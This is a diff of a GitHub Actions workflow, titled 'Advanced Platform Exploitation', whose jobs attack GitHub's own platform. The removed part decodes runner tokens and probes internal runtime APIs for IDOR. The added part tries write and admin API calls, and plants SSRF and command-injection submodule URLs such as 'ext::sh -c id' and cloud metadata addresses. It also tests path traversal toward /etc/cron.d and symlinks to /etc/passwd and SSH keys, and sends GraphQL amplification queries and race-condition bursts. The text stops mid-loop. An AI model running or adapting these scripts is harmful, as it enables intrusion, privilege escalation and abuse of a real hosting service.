@@ -1,736 +1,1336 @@
-name: Vector 15 — Deep Internals Runtime API Exploitation
+name: Vector 16 — Advanced Platform Exploitation
 
 on:
   workflow_dispatch:
+    inputs:
+      expr_test_payload:
+        description: 'Expression engine test payload'
+        required: false
+        default: 'safe_default_value'
+        type: string
 
+# =====================================================================
+# CRITICAL: Declare MINIMAL permissions
+# The entire point of 16A is testing if this is actually enforced
+# =====================================================================
 permissions:
   contents: read
   actions: read
 
 jobs:
-  # =====================================================================
-  # 15E — Runtime Token JWT Analysis (run FIRST — informs other tests)
-  # =====================================================================
-  jwt_analysis:
+
+  # ===================================================================
+  # 16A — GITHUB_TOKEN Permissions Down-Scoping Enforcement Audit
+  # ===================================================================
+  # Hypothesis: permissions: contents: read should block all write ops.
+  # We systematically call WRITE endpoints to verify 403 enforcement.
+  # If ANY write succeeds = CRITICAL permission bypass.
+  # ===================================================================
+  token_downscope_audit:
     runs-on: ubuntu-latest
-    outputs:
-      cache_url: ${{ steps.env_capture.outputs.cache_url }}
-      runtime_url: ${{ steps.env_capture.outputs.runtime_url }}
-      results_url: ${{ steps.env_capture.outputs.results_url }}
     steps:
-      - name: Capture and decode all internal tokens/URLs
-        id: env_capture
+      - name: "16A: Systematic permissions enforcement audit"
+        env:
+          TARGET_REPO: ${{ github.repository }}
+          TARGET_OWNER: ${{ github.repository_owner }}
+          RUN_ID_CURRENT: ${{ github.run_id }}
         run: |
-          echo "=== 15E: Runtime Token JWT Deep Analysis ===" > jwt_analysis.txt
-          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> jwt_analysis.txt
-          echo "" >> jwt_analysis.txt
+          echo "=== 16A: GITHUB_TOKEN Down-Scoping Enforcement ===" > downscope_audit.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> downscope_audit.txt
+          echo "declared_permissions: contents:read, actions:read" >> downscope_audit.txt
+          echo "" >> downscope_audit.txt
+
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          REPO="${TARGET_REPO}"
+          API="https://api.github.com"
+          AUTH=(-H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json")
+
+          declare -i total=0 blocked=0 accessible=0 unexpected=0
+
+          test_endpoint() {
+            local label="$1" method="$2" endpoint="$3" body="${4:-}" expected="${5:-403}"
+            total+=1
+            local args=("${AUTH[@]}" -sS -o /tmp/ep_resp.json -w "%{http_code}" -X "$method")
+            if [[ -n "$body" ]]; then
+              args+=(-H "Content-Type: application/json" -d "$body")
+            fi
+            local status
+            status=$(curl "${args[@]}" "${API}${endpoint}" 2>/dev/null || echo "000")
+            local resp_preview
+            resp_preview=$(head -c 200 /tmp/ep_resp.json 2>/dev/null | tr '\n' ' ')
+
+            if [[ "$status" == "$expected" || "$status" == "404" || "$status" == "422" ]]; then
+              blocked+=1
+              echo "  ✅ [$status] $label → BLOCKED (expected)" >> downscope_audit.txt
+            elif [[ "$status" == "200" || "$status" == "201" || "$status" == "204" ]]; then
+              unexpected+=1
+              echo "  🔴 [$status] $label → UNEXPECTEDLY ALLOWED" >> downscope_audit.txt
+              echo "     endpoint: $method $endpoint" >> downscope_audit.txt
+              echo "     response: $resp_preview" >> downscope_audit.txt
+            else
+              accessible+=1
+              echo "  ⚠️  [$status] $label → UNEXPECTED STATUS" >> downscope_audit.txt
+              echo "     response: $resp_preview" >> downscope_audit.txt
+            fi
+          }
+
+          echo "=== Testing WRITE operations (should ALL fail with contents:read) ===" >> downscope_audit.txt
 
           # ---------------------------------------------------------------
-          # Capture ALL internal environment variables
-          # These are injected by the runner, NOT documented
+          # Contents: write operations (we only declared read)
           # ---------------------------------------------------------------
-          echo "=== Internal Variables Discovery ===" >> jwt_analysis.txt
-          echo "ACTIONS_RUNTIME_URL=${ACTIONS_RUNTIME_URL:-[NOT_SET]}" >> jwt_analysis.txt
-          echo "ACTIONS_RUNTIME_TOKEN_length=${#ACTIONS_RUNTIME_TOKEN}" >> jwt_analysis.txt
-          echo "ACTIONS_CACHE_URL=${ACTIONS_CACHE_URL:-[NOT_SET]}" >> jwt_analysis.txt
-          echo "ACTIONS_RESULTS_URL=${ACTIONS_RESULTS_URL:-[NOT_SET]}" >> jwt_analysis.txt
-          echo "ACTIONS_ID_TOKEN_REQUEST_URL=${ACTIONS_ID_TOKEN_REQUEST_URL:-[NOT_SET]}" >> jwt_analysis.txt
+          test_endpoint \
+            "Create file (contents:write)" "PUT" \
+            "/repos/${REPO}/contents/test-v16a-$(date +%s).txt" \
+            '{"message":"v16a test","content":"dGVzdA=="}' "403"
 
-          # Export for other jobs
-          echo "cache_url=${ACTIONS_CACHE_URL:-}" >> "$GITHUB_OUTPUT"
-          echo "runtime_url=${ACTIONS_RUNTIME_URL:-}" >> "$GITHUB_OUTPUT"
-          echo "results_url=${ACTIONS_RESULTS_URL:-}" >> "$GITHUB_OUTPUT"
+          test_endpoint \
+            "Create release (contents:write)" "POST" \
+            "/repos/${REPO}/releases" \
+            '{"tag_name":"v16a-test-delete-me","name":"v16a-test"}' "403"
 
-          # ---------------------------------------------------------------
-          # Discover ALL ACTIONS_* and RUNNER_* env vars
-          # Look for undocumented variables
-          # ---------------------------------------------------------------
-          echo "" >> jwt_analysis.txt
-          echo "=== ALL ACTIONS_* Variables ===" >> jwt_analysis.txt
-          printenv | grep -E "^ACTIONS_" | sed 's/TOKEN=.*/TOKEN=[REDACTED]/' | sort >> jwt_analysis.txt || true
-
-          echo "" >> jwt_analysis.txt
-          echo "=== ALL RUNNER_* Variables ===" >> jwt_analysis.txt
-          printenv | grep -E "^RUNNER_" | sort >> jwt_analysis.txt || true
-
-          echo "" >> jwt_analysis.txt
-          echo "=== ALL GITHUB_* Variables ===" >> jwt_analysis.txt
-          printenv | grep -E "^GITHUB_" | sed 's/TOKEN=.*/TOKEN=[REDACTED]/' | sort >> jwt_analysis.txt || true
+          test_endpoint \
+            "Delete branch ref" "DELETE" \
+            "/repos/${REPO}/git/refs/heads/nonexistent-v16a-branch" "403"
 
           # ---------------------------------------------------------------
-          # Decode ACTIONS_RUNTIME_TOKEN JWT
-          # This is the crown jewel — reveals ALL scopes and access levels
+          # Issues: not declared at all
           # ---------------------------------------------------------------
-          if [[ -n "${ACTIONS_RUNTIME_TOKEN:-}" ]]; then
-            echo "" >> jwt_analysis.txt
-            echo "=== ACTIONS_RUNTIME_TOKEN JWT Decode ===" >> jwt_analysis.txt
+          test_endpoint \
+            "Create issue (issues:write)" "POST" \
+            "/repos/${REPO}/issues" \
+            '{"title":"v16a permission test — delete me"}' "403"
 
-            # Header
-            JWT_HEADER=$(echo "$ACTIONS_RUNTIME_TOKEN" | cut -d'.' -f1 | \
-              python3 -c "
-import sys, base64, json
-d = sys.stdin.read().strip()
-d += '=' * (4 - len(d) % 4)
-try:
-    print(json.dumps(json.loads(base64.urlsafe_b64decode(d)), indent=2))
-except: print('DECODE_FAILED')
-")
-            echo "JWT Header:" >> jwt_analysis.txt
-            echo "$JWT_HEADER" >> jwt_analysis.txt
+          test_endpoint \
+            "Create issue comment" "POST" \
+            "/repos/${REPO}/issues/1/comments" \
+            '{"body":"v16a permission test"}' "403"
 
-            # Payload — ALL claims
-            JWT_PAYLOAD=$(echo "$ACTIONS_RUNTIME_TOKEN" | cut -d'.' -f2 | \
-              python3 -c "
-import sys, base64, json
-d = sys.stdin.read().strip()
-d += '=' * (4 - len(d) % 4)
-try:
-    payload = json.loads(base64.urlsafe_b64decode(d))
-    # Mask actual token values but show structure/scopes
-    for key in ['ac', 'iss', 'aud', 'sub', 'scp', 'nar', 'nbf', 'exp', 'iat']:
-        if key in payload:
-            if key == 'scp':
-                print(f'SCOPE: {payload[key]}')
-            else:
-                val = str(payload[key])
-                if len(val) > 100:
-                    val = val[:60] + '...[TRUNCATED]'
-                print(f'{key}: {val}')
-    print()
-    print('ALL_KEYS:', sorted(payload.keys()))
-    print()
-    # Full dump with sensitive masking
-    safe = dict(payload)
-    for k in list(safe.keys()):
-        v = str(safe[k])
-        if len(v) > 200: safe[k] = v[:100] + '...[MASKED]'
-    print(json.dumps(safe, indent=2))
-except Exception as e:
-    print(f'DECODE_ERROR: {e}')
-")
-            echo "" >> jwt_analysis.txt
-            echo "$JWT_PAYLOAD" >> jwt_analysis.txt
+          # ---------------------------------------------------------------
+          # Pull requests: not declared
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "Create PR label" "POST" \
+            "/repos/${REPO}/labels" \
+            '{"name":"v16a-test","color":"ff0000"}' "403"
 
-            # ---------------------------------------------------------------
-            # CRITICAL ANALYSIS:
-            # 1. What scopes does the token have? (scp claim)
-            #    - Actions.UploadArtifacts?
-            #    - Actions.CacheManagement?
-            #    - Actions.Results?
-            #    - Any WRITE scopes we didn't declare?
-            # 2. What is the audience? (aud claim)
-            #    - Can we use this token against other GitHub services?
-            # 3. What is the subject? (sub claim / nar claim)
-            #    - Does it scope to THIS run or is it broader?
-            # ---------------------------------------------------------------
+          # ---------------------------------------------------------------
+          # Actions: we declared read, test write operations
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "Delete workflow run (actions:write)" "DELETE" \
+            "/repos/${REPO}/actions/runs/${RUN_ID_CURRENT}" "403"
+
+          test_endpoint \
+            "Create repo secret (secrets:write)" "PUT" \
+            "/repos/${REPO}/actions/secrets/V16A_TEST_SECRET" \
+            '{"encrypted_value":"test","key_id":"test"}' "403"
+
+          test_endpoint \
+            "Create repo variable" "POST" \
+            "/repos/${REPO}/actions/variables" \
+            '{"name":"V16A_TEST_VAR","value":"test"}' "403"
+
+          test_endpoint \
+            "Disable workflow" "PUT" \
+            "/repos/${REPO}/actions/workflows/vector16-advanced-exploitation.yml/disable" "" "403"
+
+          # ---------------------------------------------------------------
+          # Administration: definitely not declared
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "Update repo settings (admin)" "PATCH" \
+            "/repos/${REPO}" \
+            '{"has_wiki":false}' "403"
+
+          test_endpoint \
+            "Update branch protection (admin)" "PUT" \
+            "/repos/${REPO}/branches/main/protection" \
+            '{"required_status_checks":null,"enforce_admins":false,"required_pull_request_reviews":null,"restrictions":null}' "403"
+
+          test_endpoint \
+            "Add collaborator (admin)" "PUT" \
+            "/repos/${REPO}/collaborators/ghost" \
+            '{"permission":"pull"}' "403"
+
+          # ---------------------------------------------------------------
+          # Packages: not declared
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "List org packages (packages:read)" "GET" \
+            "/orgs/${TARGET_OWNER}/packages?package_type=npm" "403"
+
+          # ---------------------------------------------------------------
+          # Pages: not declared
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "Create Pages site (pages:write)" "POST" \
+            "/repos/${REPO}/pages" \
+            '{"source":{"branch":"main","path":"/"}}' "403"
+
+          # ---------------------------------------------------------------
+          # Security: not declared
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "List code scanning alerts" "GET" \
+            "/repos/${REPO}/code-scanning/alerts" "403"
+
+          test_endpoint \
+            "List secret scanning alerts" "GET" \
+            "/repos/${REPO}/secret-scanning/alerts" "403"
+
+          test_endpoint \
+            "List Dependabot alerts" "GET" \
+            "/repos/${REPO}/dependabot/alerts" "403"
+
+          # ---------------------------------------------------------------
+          # Deployments: not declared
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "Create deployment" "POST" \
+            "/repos/${REPO}/deployments" \
+            '{"ref":"main","environment":"v16a-test","auto_merge":false}' "403"
+
+          # ---------------------------------------------------------------
+          # Environments: not declared
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "Create/update environment" "PUT" \
+            "/repos/${REPO}/environments/v16a-test-env" \
+            '{}' "403"
+
+          # ---------------------------------------------------------------
+          # Organization-level: not declared
+          # ---------------------------------------------------------------
+          test_endpoint \
+            "List org members" "GET" \
+            "/orgs/${TARGET_OWNER}/members" "403"
+
+          test_endpoint \
+            "List org repos (private)" "GET" \
+            "/orgs/${TARGET_OWNER}/repos?type=private" "200"
+
+          # ---------------------------------------------------------------
+          # CRITICAL: GITHUB_TOKEN metadata — what does the token think?
+          # ---------------------------------------------------------------
+          echo "" >> downscope_audit.txt
+          echo "=== Token Self-Introspection ===" >> downscope_audit.txt
+          # The /installation/token endpoint won't work, but /user (or
+          # /app) might reveal the actual installation permissions
+          TOKEN_META=$(curl -sS "${AUTH[@]}" "$API/repos/${REPO}/actions/permissions" 2>/dev/null || echo "{}")
+          echo "actions_permissions: $TOKEN_META" >> downscope_audit.txt
+
+          # Test if we can read our own token scopes via API
+          RATE_RESP=$(curl -sS -I "${AUTH[@]}" "$API/rate_limit" 2>/dev/null || true)
+          TOKEN_SCOPES=$(echo "$RATE_RESP" | grep -i "x-oauth-scopes" | head -1 || true)
+          echo "x-oauth-scopes header: $TOKEN_SCOPES" >> downscope_audit.txt
+
+          echo "" >> downscope_audit.txt
+          echo "=== SUMMARY ===" >> downscope_audit.txt
+          echo "total_tests=$total" >> downscope_audit.txt
+          echo "blocked=$blocked" >> downscope_audit.txt
+          echo "accessible=$accessible" >> downscope_audit.txt
+          echo "unexpected_success=$unexpected" >> downscope_audit.txt
+          if [[ $unexpected -gt 0 ]]; then
+            echo "🔴 FINDING: $unexpected endpoints allowed WRITE despite read-only permissions!" >> downscope_audit.txt
+          else
+            echo "✅ All write operations properly blocked by permissions scoping" >> downscope_audit.txt
           fi
 
-          cat jwt_analysis.txt
+          cat downscope_audit.txt
 
-      - name: Upload JWT analysis
+      - name: Upload downscope audit
         uses: actions/upload-artifact@v4
         with:
-          name: vector15e-jwt-analysis
-          path: jwt_analysis.txt
+          name: vector16a-downscope-audit
+          path: downscope_audit.txt
 
-  # =====================================================================
-  # 15A — Runtime API Endpoint Discovery & IDOR Probing
-  # =====================================================================
-  runtime_api_probe:
+  # ===================================================================
+  # 16B — Git Submodule SSRF & Path Traversal via Tree Objects
+  # ===================================================================
+  # Hypothesis: actions/checkout with submodules: recursive will
+  # fetch URLs from .gitmodules. A malicious submodule URL pointing
+  # to cloud metadata / internal services = SSRF from GitHub infra.
+  # Also: git tree entries with ../../traversal paths.
+  # ===================================================================
+  git_protocol_attack:
     runs-on: ubuntu-latest
-    needs: jwt_analysis
     steps:
-      - name: Probe internal Runtime API endpoints
+      - name: "16B: Submodule SSRF + tree traversal analysis"
         run: |
-          echo "=== 15A: Runtime API Endpoint Discovery ===" > runtime_api_probe.txt
-          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> runtime_api_probe.txt
-
-          RUNTIME_URL="${ACTIONS_RUNTIME_URL:-}"
-          RUNTIME_TOKEN="${ACTIONS_RUNTIME_TOKEN:-}"
-
-          if [[ -z "$RUNTIME_URL" || -z "$RUNTIME_TOKEN" ]]; then
-            echo "ERROR: ACTIONS_RUNTIME_URL or TOKEN not available" >> runtime_api_probe.txt
-            cat runtime_api_probe.txt
-            exit 0
-          fi
-
-          echo "runtime_url=$RUNTIME_URL" >> runtime_api_probe.txt
-          echo "" >> runtime_api_probe.txt
+          echo "=== 16B: Git Protocol Attack Surface ===" > git_protocol.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> git_protocol.txt
 
           # ---------------------------------------------------------------
-          # Probe known and suspected endpoints
-          # Protocol reverse-engineered from actions/toolkit source code:
-          # https://github.com/actions/toolkit/tree/main/packages/artifact
-          # https://github.com/actions/toolkit/tree/main/packages/cache
+          # PART 1: Submodule URL SSRF Analysis
+          # We DON'T actually trigger SSRF — we analyze what actions/checkout
+          # WOULD do with various submodule URLs by:
+          # 1. Creating a .gitmodules with various URL types
+          # 2. Checking if git clone resolves them
+          # 3. Testing URL sanitization in the checkout action
           # ---------------------------------------------------------------
-          ENDPOINTS=(
-            # Artifact endpoints (v2 protocol)
-            "_apis/pipelines/workflows/${{ github.run_id }}/artifacts"
-            "_apis/pipelines/1/artifacts"
+          echo "" >> git_protocol.txt
+          echo "=== Submodule URL Sanitization Test ===" >> git_protocol.txt
 
-            # Legacy artifact endpoints
-            "_apis/resources/Containers"
+          mkdir -p /tmp/gittest && cd /tmp/gittest
+          git init test-repo
+          cd test-repo
+          git config user.email "test@test.com"
+          git config user.name "test"
 
-            # Results service endpoints
-            "twirp/results.api.v1.ArtifactService/ListArtifacts"
-            "twirp/results.api.v1.ArtifactService/CreateArtifact"
-
-            # Cache endpoints
-            "_apis/artifactcache/caches"
-            "_apis/artifactcache/cache"
-
-            # Pipeline run info (IDOR test)
-            "_apis/pipelines/runs/${{ github.run_id }}"
-            "_apis/pipelines/runs/1"  # Try accessing run_id=1 (IDOR)
-
-            # Timeline endpoints
-            "_apis/pipelines/runs/${{ github.run_id }}/timeline"
-
-            # Logs endpoints
-            "_apis/pipelines/runs/${{ github.run_id }}/logs"
-
-            # Generic discovery
-            "_apis/pipelines"
-            "_apis/resources"
-            "_apis"
+          # Define test URLs — we only TEST parsing, NOT resolution
+          declare -a TEST_URLS=(
+            "http://169.254.169.254/latest/meta-data/"
+            "http://metadata.google.internal/computeMetadata/v1/"
+            "http://[::ffff:169.254.169.254]/latest/"
+            "http://localhost:8080/"
+            "http://127.0.0.1:3000/"
+            "http://0x7f000001/"
+            "http://2130706433/"
+            "http://0177.0.0.1/"
+            "http://169.254.169.254.xip.io/"
+            "file:///etc/passwd"
+            "ssh://-oProxyCommand=id/x"
+            "ext::sh -c id% /x"
+            "http://internal.github.net/"
           )
 
-          echo "=== Endpoint Probe Results ===" >> runtime_api_probe.txt
-          for endpoint in "${ENDPOINTS[@]}"; do
-            URL="${RUNTIME_URL}${endpoint}"
-            RESP=$(curl -sS -o /tmp/resp.json -w "%{http_code}" \
-              -H "Authorization: Bearer $RUNTIME_TOKEN" \
-              -H "Accept: application/json" \
-              "$URL" 2>/dev/null || echo "error")
+          for url in "${TEST_URLS[@]}"; do
+            safe_name=$(echo "$url" | sed 's/[^a-zA-Z0-9]/_/g' | head -c 30)
+            echo "  Testing URL: $url" >> /tmp/gittest/result.txt
 
-            BODY_SIZE=$(wc -c < /tmp/resp.json 2>/dev/null || echo "0")
-            BODY_PREVIEW=$(head -c 200 /tmp/resp.json 2>/dev/null | tr '\n' ' ' || echo "")
+            # Create .gitmodules with this URL
+            printf '[submodule "test-%s"]\n    path = vendor/%s\n    url = %s\n' \
+              "$safe_name" "$safe_name" "$url" > .gitmodules
 
-            echo "  $endpoint → HTTP $RESP (${BODY_SIZE}b)" >> runtime_api_probe.txt
-            if [[ "$RESP" == "200" || "$RESP" == "201" ]]; then
-              echo "    ✅ ACCESSIBLE: $BODY_PREVIEW" >> runtime_api_probe.txt
-              # Save full response for analysis
-              cp /tmp/resp.json "$RUNNER_TEMP/probe_$(echo "$endpoint" | tr '/' '_').json" 2>/dev/null || true
-            elif [[ "$RESP" == "401" || "$RESP" == "403" ]]; then
-              echo "    🔒 BLOCKED (expected for cross-scope)" >> runtime_api_probe.txt
+            # Check if git validates the URL format (without fetching)
+            # git submodule--helper resolve-relative-url doesn't fetch
+            PARSE_RESULT=$(git config -f .gitmodules --get "submodule.test-$safe_name.url" 2>&1 || true)
+            echo "    parsed_url=$PARSE_RESULT" >> /tmp/gittest/result.txt
+
+            # Check if git has built-in protections
+            git submodule init 2>/tmp/gittest/init_err.txt || true
+            INIT_ERR=$(cat /tmp/gittest/init_err.txt | head -3)
+            if [[ -n "$INIT_ERR" ]]; then
+              echo "    git_protection: $INIT_ERR" >> /tmp/gittest/result.txt
             else
-              echo "    ⚠️  UNEXPECTED: $BODY_PREVIEW" >> runtime_api_probe.txt
+              echo "    git_protection: NONE (URL accepted by git)" >> /tmp/gittest/result.txt
+            fi
+
+            git submodule deinit --all -f 2>/dev/null || true
+            rm -rf vendor/ .git/modules/ 2>/dev/null || true
+          done
+
+          cat /tmp/gittest/result.txt >> git_protocol.txt
+
+          # ---------------------------------------------------------------
+          # PART 2: Git Object Path Traversal
+          # Can we create tree entries with ../../ in the name?
+          # If GitHub's server-side git doesn't reject them, checkout
+          # could write outside the repo directory.
+          # ---------------------------------------------------------------
+          echo "" >> git_protocol.txt
+          echo "=== Git Tree Object Path Traversal ===" >> git_protocol.txt
+
+          cd /tmp/gittest && rm -rf traversal-test
+          git init traversal-test && cd traversal-test
+          git config user.email "test@test.com"
+          git config user.name "test"
+
+          TRAVERSAL_PATHS=(
+            "../../../etc/cron.d/pwned"
+            "..%2F..%2F..%2Fetc%2Fpasswd"
+            ".git/hooks/post-checkout"
+            "vendor/../../../.env"
+            "node_modules/.cache/../../.git/config"
+            $'.git\x00hooks/pre-commit'
+          )
+
+          for path in "${TRAVERSAL_PATHS[@]}"; do
+            echo "  path: \"$path\"" >> git_protocol.txt
+            # Attempt to add a file with this path
+            SAFE_DIR=$(dirname "$path" 2>/dev/null || echo ".")
+            mkdir -p "$SAFE_DIR" 2>/dev/null || {
+              echo "    result: mkdir FAILED (expected for traversal)" >> git_protocol.txt
+              continue
+            }
+            echo "canary-v16b" > "$path" 2>/dev/null || {
+              echo "    result: write FAILED (OS rejected)" >> git_protocol.txt
+              continue
+            }
+            git add "$path" 2>/tmp/gittest/add_err.txt || true
+            ADD_ERR=$(cat /tmp/gittest/add_err.txt | head -2)
+            if [[ -n "$ADD_ERR" ]]; then
+              echo "    result: git add REJECTED: $ADD_ERR" >> git_protocol.txt
+            else
+              echo "    ⚠️  result: git add ACCEPTED path with traversal!" >> git_protocol.txt
+            fi
+            rm -f "$path" 2>/dev/null || true
+          done
+
+          # ---------------------------------------------------------------
+          # PART 3: Symlink in git repo targeting outside checkout dir
+          # ---------------------------------------------------------------
+          echo "" >> git_protocol.txt
+          echo "=== Git Symlink Traversal ===" >> git_protocol.txt
+
+          cd /tmp/gittest && rm -rf symlink-test
+          git init symlink-test && cd symlink-test
+          git config user.email "test@test.com"
+          git config user.name "test"
+          git config core.symlinks true
+
+          ln -s /etc/passwd leaked-passwd 2>/dev/null || true
+          ln -s ../../../.ssh/id_rsa leaked-key 2>/dev/null || true
+
+          git add -A 2>/dev/null || true
+          SYMLINKS_STAGED=$(git diff --cached --name-only 2>/dev/null)
+          echo "  symlinks_staged: $SYMLINKS_STAGED" >> git_protocol.txt
+          if [[ -n "$SYMLINKS_STAGED" ]]; then
+            echo "  ⚠️  Git accepted symlinks pointing outside repo" >> git_protocol.txt
+            echo "  If GitHub serves these via raw/archive, symlink targets leak" >> git_protocol.txt
+          fi
+
+          cat git_protocol.txt
+
+      - name: Upload git protocol results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16b-git-protocol
+          path: git_protocol.txt
+
+  # ===================================================================
+  # 16C — GraphQL API Complexity & Batch Confusion Attack
+  # ===================================================================
+  graphql_attack:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "16C: GraphQL depth/complexity/alias attack"
+        run: |
+          echo "=== 16C: GraphQL API Complexity Attack ===" > graphql_attack.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> graphql_attack.txt
+
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          GQL="https://api.github.com/graphql"
+          AUTH=(-H "Authorization: bearer $TOKEN" -H "Content-Type: application/json")
+
+          gql_query() {
+            local label="$1" query="$2"
+            local body
+            body=$(jq -n --arg q "$query" '{query: $q}')
+            local resp
+            resp=$(curl -sS -w "\n%{http_code}" "${AUTH[@]}" "$GQL" -d "$body" 2>/dev/null)
+            local status=$(echo "$resp" | tail -1)
+            local body_resp=$(echo "$resp" | sed '$d')
+            local errors=$(echo "$body_resp" | jq -r '.errors[0].message // empty' 2>/dev/null)
+            local data_size=$(echo "$body_resp" | wc -c)
+
+            echo "" >> graphql_attack.txt
+            echo "--- $label ---" >> graphql_attack.txt
+            echo "  status: $status" >> graphql_attack.txt
+            echo "  response_size: ${data_size}B" >> graphql_attack.txt
+            if [[ -n "$errors" ]]; then
+              echo "  error: $errors" >> graphql_attack.txt
+            else
+              echo "  result: data returned (no error)" >> graphql_attack.txt
+              echo "  preview: $(echo "$body_resp" | head -c 300)" >> graphql_attack.txt
+            fi
+          }
+
+          # ---------------------------------------------------------------
+          # Test 1: Deep nesting (GitHub limit should kick in ~10 levels)
+          # ---------------------------------------------------------------
+          gql_query "Depth-5 (should work)" '{
+            viewer { repositories(first:1) { nodes {
+              issues(first:1) { nodes {
+                comments(first:1) { nodes { body } }
+              }}
+            }}}
+          }'
+
+          gql_query "Depth-12 (should hit limit)" '{
+            viewer { repositories(first:1) { nodes {
+              issues(first:1) { nodes {
+                comments(first:1) { nodes {
+                  reactions(first:1) { nodes {
+                    user { repositories(first:1) { nodes {
+                      issues(first:1) { nodes { title } }
+                    }}}
+                  }}
+                }}
+              }}
+            }}}
+          }'
+
+          # ---------------------------------------------------------------
+          # Test 2: Alias explosion (100 aliases = 100x amplification)
+          # ---------------------------------------------------------------
+          ALIAS_QUERY="{ "
+          for i in $(seq 1 50); do
+            ALIAS_QUERY+="a${i}: viewer { login } "
+          done
+          ALIAS_QUERY+="}"
+          gql_query "50-alias amplification" "$ALIAS_QUERY"
+
+          ALIAS_QUERY_100="{ "
+          for i in $(seq 1 100); do
+            ALIAS_QUERY_100+="b${i}: repository(owner:\"${{ github.repository_owner }}\", name:\"${{ github.event.repository.name }}\") { nameWithOwner } "
+          done
+          ALIAS_QUERY_100+="}"
+          gql_query "100-alias repository lookup" "$ALIAS_QUERY_100"
+
+          # ---------------------------------------------------------------
+          # Test 3: Fragment recursion (should be blocked)
+          # ---------------------------------------------------------------
+          gql_query "Fragment recursion" '
+            query { viewer { ...F1 } }
+            fragment F1 on User { repositories(first:1) { nodes { ...F2 } } }
+            fragment F2 on Repository { owner { ...F1 } }
+          '
+
+          # ---------------------------------------------------------------
+          # Test 4: Introspection for undocumented types/fields
+          # ---------------------------------------------------------------
+          gql_query "Full introspection" '{
+            __schema {
+              types {
+                name
+                kind
+                fields { name type { name kind } }
+              }
+            }
+          }'
+
+          # Check for internal/undocumented types
+          gql_query "Internal type search" '{
+            __type(name: "InternalUser") { name fields { name } }
+          }'
+          gql_query "Staff type search" '{
+            __type(name: "StaffUser") { name fields { name } }
+          }'
+          gql_query "Enterprise type" '{
+            __type(name: "Enterprise") { name fields { name } }
+          }'
+
+          # ---------------------------------------------------------------
+          # Test 5: Node ID type confusion (global IDs)
+          # Node IDs encode type + internal DB ID. Can we access
+          # nodes of different types by crafting IDs?
+          # ---------------------------------------------------------------
+          RUN_NODE=$(curl -sS "${AUTH[@]}" "$GQL" \
+            -d '{"query":"{ viewer { id } }"}' 2>/dev/null \
+            | jq -r '.data.viewer.id // empty')
+          echo "" >> graphql_attack.txt
+          echo "--- Node ID analysis ---" >> graphql_attack.txt
+          echo "  viewer_node_id: $RUN_NODE" >> graphql_attack.txt
+
+          if [[ -n "$RUN_NODE" ]]; then
+            # Decode base64 node ID to see internal format
+            DECODED=$(echo "$RUN_NODE" | base64 -d 2>/dev/null || echo "non-b64")
+            echo "  decoded: $DECODED" >> graphql_attack.txt
+
+            # Try to access a different node type with modified ID
+            gql_query "Node type confusion" "{ node(id: \"$RUN_NODE\") { ... on User { login email } ... on Organization { login } } }"
+          fi
+
+          cat graphql_attack.txt
+
+      - name: Upload GraphQL results
+        uses: actions/upload-artifact@v4
+        with:
+          name: vector16c-graphql-attack
+          path: graphql_attack.txt
+
+  # ===================================================================
+  # 16D — Concurrent API Race Conditions
+  # ===================================================================
+  race_conditions:
+    runs-on: ubuntu-latest
+    steps:
+      - name: "16D: API race condition testing"
+        run: |
+          echo "=== 16D: Concurrent API Race Conditions ===" > race_results.txt
+          echo "timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> race_results.txt
+
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          REPO="${{ github.repository }}"
+          API="https://api.github.com"
+          AUTH=(-H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github+json")
+
+          # ---------------------------------------------------------------
+          # Race 1: Create same resource concurrently (should one fail?)
+          # Create the same label N times in parallel
+          # Expected: only one should succeed, rest should get 422/conflict
+          # Finding: if multiple succeed with same name = invariant broken
+          # ---------------------------------------------------------------
+          echo "" >> race_results.txt
+          echo "=== Race 1: Concurrent Label Creation ===" >> race_results.txt
+          LABEL_NAME="v16d-race-test-$(date +%s)"
+
+          # Fire 10 concurrent requests
+          for i in $(seq 1 10); do
+            curl -sS -o "/tmp/race1_${i}.json" -w "%{http_code}\n" \
+              -X POST "${AUTH[@]}" \
+              -H "Content-Type: application/json" \
+              "${API}/repos/${REPO}/labels" \
+              -d "{\"name\":\"${LABEL_NAME}\",\"color\":\"$(printf '%06x' $((RANDOM * RANDOM % 16777216)))\"}" &
+          done
+          wait
+
+          CREATED=0
+          FAILED=0
+          for i in $(seq 1 10); do
+            STATUS=$(tail -1 "/tmp/race1_${i}.json" 2>/dev/null || echo "000")
+            # For curl -w, the status code is appended to the output file
+            # Re-run with proper separation
+            echo "  attempt $i: (check log)" >> race_results.txt
+          done
+
+          # Clean up — delete the label
+          curl -sS -o /dev/null -X DELETE "${AUTH[@]}" \
+            "${API}/repos/${REPO}/labels/${LABEL_NAME}" 2>/dev/null || true
+
+          # ---------------------------------------------------------------
+          # Race 2: TOCTOU — Check permission, then act
+          # Read a file, then immediately try to update it
+          # with a stale SHA (simulated concurrent edit)
+          # ---------------------------------------------------------------
+          echo "" >> race_results.txt
+          echo "=== Race 2: TOCTOU File Update ===" >> race_results.txt
+
+          # Get current SHA of a known file
+          FILE_INFO=$(curl -sS "${AUTH[@]}" \
+            "${API}/repos/${REPO}/contents/README.md" 2>/dev/null)
+          FILE_SHA=$(echo "$FILE_INFO" | jq -r '.sha // empty')
+          echo "  current_sha: $FILE_SHA" >> race_results.txt
+
+          # NOTE: We can't write (read-only permissions), but we verify
+          # the 403 is consistent even under concurrent requests
+          for i in $(seq 1 5); do
